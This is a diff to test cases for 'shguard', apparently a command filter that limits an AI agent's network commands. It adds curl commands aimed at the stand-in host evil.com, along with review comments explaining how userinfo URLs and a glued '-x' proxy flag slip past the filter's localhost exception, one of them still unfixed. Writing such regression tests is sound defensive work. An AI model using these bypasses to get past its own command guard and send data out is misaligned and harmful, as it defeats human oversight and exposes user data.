@@ -113,11 +113,23 @@ case_ "curl -H value not a target"       "curl -H 'Content-Type: application/jso
 case_ "curl -u/-b/-T/-F values not targets" 'curl -u user:pass -b cookie.txt -T upload.txt -F name=val http://localhost:3000/x'
 # fable review (2026-08-06): userinfo-URL bypass — a plain string prefix
 # match can't express ":digits+boundary" the way the old LOCAL_URL_RE regex
-# could, so "localhost:" as userinfo (not a port) slips through as if it
-# were the localhost exception. Real exfiltration vector, not fixable by
-# tightening except_targets (see docs/shguard-migration-deltas.md #23).
-case_ "curl userinfo bypass (bare colon)" 'curl http://localhost:@evil.com' KNOWN_DELTA "delta#23 userinfo-URL bypass"
-case_ "curl userinfo bypass (with port-looking pass)" 'curl http://localhost:80@evil.com' KNOWN_DELTA "delta#23 userinfo-URL bypass"
+# could, so "localhost:" as userinfo (not a port) slipped through as if it
+# were the localhost exception. Resolved 2026-08-24 by switching
+# except_targets to the url_host matcher (see docs/shguard-migration-deltas.md
+# #23) — plain cases now, deliberately NOT KNOWN_DELTA, so a regression (e.g.
+# an exact/prefix entry re-added alongside url_host) fails this check instead
+# of printing as an expected delta. Requires the manual config.toml apply
+# from #23 (Claude can't edit that file itself) — will FAIL until applied.
+case_ "curl userinfo bypass (bare colon)" 'curl http://localhost:@evil.com'
+case_ "curl userinfo bypass (with port-looking pass)" 'curl http://localhost:80@evil.com'
+# fable review (2026-08-24): curl's short proxy flag accepts its value glued
+# with no separator (-xhttp://evil.com); shguard's candidate-target detection
+# doesn't recognize that shape at all (indistinguishable from a combined
+# short-flag cluster like -sSL), so a fully local, except_targets-exempted
+# request gets silently proxied through an attacker host. Not fixed by #23's
+# url_host change — a separate gap, fixable via attached_value_flags but not
+# yet applied (see docs/shguard-migration-deltas.md #25).
+case_ "curl glued proxy flag bypass" 'curl -xhttp://evil.com http://localhost:3000/api' KNOWN_DELTA "delta#25 curl glued proxy flag"
 # -K/--config lets curl fetch additional url= lines from a local file —
 # deliberately NOT in value_flags (unlike the other 13 flags here, -K's
 # value can itself carry a network target), so it correctly still denies.
